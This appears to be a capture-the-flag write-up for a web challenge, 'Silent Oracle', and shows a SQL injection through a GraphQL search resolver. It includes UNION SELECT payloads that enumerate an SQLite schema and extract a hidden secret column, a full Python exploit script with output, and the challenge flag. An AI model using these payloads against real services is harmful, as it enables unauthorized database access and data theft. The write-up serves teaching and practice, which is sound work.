# Silent Oracle - Writeup

**Category:** `Web`  
**Event:** `0xvoidCTF 2026`  
**Challenge name:** `silent oracle`  
**Description:** `A quiet internal directory exposes only a small public surface. The useful answers are hidden behind how the service thinks about people and roles.`  
**Target:** `http://nexus-nektar-dc0f.challs.0xv01d-ctf.xyz:8001/`

## TL;DR

The application exposes a tiny public GraphQL API, but the `users(search: ...)` resolver builds an unsafe SQL query behind the scenes.  
By injecting a `UNION SELECT` through the `search` parameter, we can enumerate the SQLite schema, discover a hidden `secret` column in the `users` table, and exfiltrate the admin flag through the publicly returned GraphQL fields.

**Flag:** `0xV01D{1dcf33c9-0fd4-4cdc-a617-f185960212df}`

---

## Challenge Overview

The landing page presents itself as a harmless internal directory:

- a single web page,
- a text area for GraphQL queries,
- and a button that sends requests to `/graphql`.

The description gives the most important hint:

> “The useful answers are hidden behind how the service thinks about people and roles.”

That suggests:

1. The public schema may look safe.
2. The interesting bug is probably in the backend’s handling of users, roles, or lookup logic.
3. The vulnerability is more likely in implementation than in the visible GraphQL schema itself.

---

## Initial Recon

Requesting the homepage:

```bash
curl -i http://nexus-nektar-dc0f.challs.0xv01d-ctf.xyz:8001/
```

The returned HTML contains this client-side request:

```js
const res = await fetch("/graphql", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ query: queryBox.value })
});
```

So the entire application surface is the GraphQL endpoint.

The default query shown in the page is:

```graphql
query {
  users(search: "a") {
    id
    username
    displayName
    role
    bio
  }
}
```

This already reveals the public object model:

- `id`
- `username`
- `displayName`
- `role`
- `bio`

No obvious `secret`, `token`, or `flag` field is exposed.

---

## Schema Enumeration

GraphQL introspection works, so the next step is to inspect the schema directly.

### Query Type

```graphql
{
  __type(name: "Query") {
    name
    fields {
      name
      args {
        name
      }
    }
  }
}
```

Result:

```text
Query
  - about
  - users(search)
```

### User Type

```graphql
{
  __type(name: "User") {
    name
    fields {
      name
    }
  }
}
```

Result:

```text
User
  - id
  - username
  - displayName
  - role
  - bio
```

So the public schema is intentionally tiny.  
There are no admin-only fields or hidden GraphQL resolvers exposed through introspection.

That shifts the investigation away from GraphQL features and toward the resolver implementation.

---

## Behavior Clues in `search`

The `users(search: ...)` parameter behaves like backend SQL pattern matching.

### Normal search

```graphql
query {
  users(search: "guest") {
    id
    username
    displayName
    role
    bio
  }
}
```

Returns only the guest account.

### Wildcard search

```graphql
query {
  users(search: "%") {
    id
    username
    displayName
    role
    bio
  }
}
```

Returns all users:

- guest
- mira
- rakan
- admin

This is a strong signal that the backend is using SQL `LIKE` or equivalent string interpolation around the user-controlled `search` parameter.

That makes SQL injection the most likely bug class.

---

## Confirming SQL Injection

To test whether the search string is concatenated into a SQL query, use a `UNION SELECT` that matches the five visible GraphQL fields:

```graphql
query($s:String!){
  users(search:$s){
    id
    username
    displayName
    role
    bio
  }
}
```

With variables:

```json
{
  "s": "%' UNION SELECT 999,'x','y','z','w' -- "
}
```

If the input is injectable, the query result will include a synthetic row:

```json
{
  "id": "999",
  "username": "x",
  "displayName": "y",
  "role": "z",
  "bio": "w"
}
```

That row appeared in the response, confirming that:

- the backend query is injectable,
- the result set shape is five columns,
- and the data is flowing directly into the GraphQL `User` object.

At this point, the problem becomes straightforward database extraction.

---

## Enumerating the Schema

SQLite exposes schema metadata through `sqlite_master`, so we can enumerate tables using the same five-column `UNION`.

Payload:

```json
{
  "s": "%' UNION SELECT 999,name,sql,'meta','tbl' FROM sqlite_master WHERE type='table' -- "
}
```

This revealed the important tables:

### `audit_log`

```sql
CREATE TABLE audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event TEXT NOT NULL,
  created_by TEXT NOT NULL
)
```

### `users`

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  display_name TEXT NOT NULL,
  role TEXT NOT NULL,
  bio TEXT NOT NULL,
  secret TEXT NOT NULL
)
```

That `secret` column is the real prize.  
It is not exposed through GraphQL, but it is still stored in the same table backing the resolver.

---

## Extracting the Flag

Now that we know the column names, we can map them directly into the five GraphQL-returned fields:

```json
{
  "s": "%' UNION SELECT id,username,display_name,role,secret FROM users -- "
}
```

This causes the backend to return the hidden `secret` field as the public `bio` field.

The response included:

```json
{
  "id": "4",
  "username": "admin",
  "displayName": "Directory Admin",
  "role": "admin",
  "bio": "0xV01D{1dcf33c9-0fd4-4cdc-a617-f185960212df}"
}
```

So the admin’s secret is the flag.

---

## Audit Log Notes

The `audit_log` table was not required to get the flag, but it gives some nice context:

```json
{
  "s": "%' UNION SELECT id,event,created_by,'audit',event FROM audit_log -- "
}
```

Interesting entries included:

- `directory service deployed`
- `public GraphQL endpoint enabled`
- `search resolver patched quickly before launch`

That last message is a nice hint from the challenge author that the `search` resolver is exactly where the bug lives.

---

## Root Cause

The resolver is very likely doing something logically equivalent to this:

```python
sql = f"SELECT id, username, display_name, role, bio FROM users WHERE username LIKE '{search}'"
```

or:

```python
sql = "SELECT id, username, display_name, role, bio FROM users WHERE username LIKE '%" + search + "%'"
```

Because the user input is not safely parameterized, an attacker can terminate the string and append arbitrary SQL:

```sql
%' UNION SELECT id,username,display_name,role,secret FROM users -- 
```

The GraphQL schema appears safe, but the resolver underneath it is not.

This is a classic example of:

- a small public surface,
- a harmless-looking GraphQL API,
- and a backend implementation bug that completely breaks data isolation.

---

## Full Solution Script

The following script:

1. verifies the injection,
2. enumerates tables,
3. extracts all `users.secret` values,
4. and prints the flag.

```python
#!/usr/bin/env python3
import json
import re
import requests

URL = "http://nexus-nektar-dc0f.challs.0xv01d-ctf.xyz:8001/graphql"

QUERY = """
query($s:String!){
  users(search:$s){
    id
    username
    displayName
    role
    bio
  }
}
"""


def run_payload(search_value: str):
    r = requests.post(
        URL,
        json={
            "query": QUERY,
            "variables": {"s": search_value},
        },
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()
    if "errors" in data:
        raise RuntimeError(json.dumps(data["errors"], indent=2))
    return data["data"]["users"]


def main():
    print("[*] Confirming SQL injection with UNION row")
    rows = run_payload("%' UNION SELECT 999,'x','y','z','w' -- ")
    injected = [r for r in rows if r["username"] == "x" and r["bio"] == "w"]
    if not injected:
        raise RuntimeError("Injection check failed")
    print("[+] SQL injection confirmed")

    print("[*] Enumerating tables")
    tables = run_payload(
        "%' UNION SELECT 999,name,sql,'meta','tbl' FROM sqlite_master WHERE type='table' -- "
    )
    for row in tables:
        if row["role"] == "meta":
            print(f"[table] {row['username']}")
            print(row["displayName"])
            print()

    print("[*] Extracting user secrets")
    rows = run_payload("%' UNION SELECT id,username,display_name,role,secret FROM users -- ")

    flag = None
    for row in rows:
        if row["bio"].startswith("0xV01D{"):
            flag = row["bio"]
            print(f"[+] Flag found in user {row['username']}: {flag}")

    if not flag:
        for row in rows:
            m = re.search(r"0xV01D\\{[^}]+\\}", row["bio"])
            if m:
                flag = m.group(0)
                print(f"[+] Flag found in user {row['username']}: {flag}")
                break

    if not flag:
        raise RuntimeError("Flag not found")


if __name__ == "__main__":
    main()
```

### Example run

```text
[*] Confirming SQL injection with UNION row
[+] SQL injection confirmed
[*] Enumerating tables
[table] audit_log
CREATE TABLE audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  event TEXT NOT NULL,
  created_by TEXT NOT NULL
)

[table] sqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)

[table] users
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT NOT NULL UNIQUE,
  display_name TEXT NOT NULL,
  role TEXT NOT NULL,
  bio TEXT NOT NULL,
  secret TEXT NOT NULL
)

[*] Extracting user secrets
[+] Flag found in user admin: 0xV01D{1dcf33c9-0fd4-4cdc-a617-f185960212df}
```

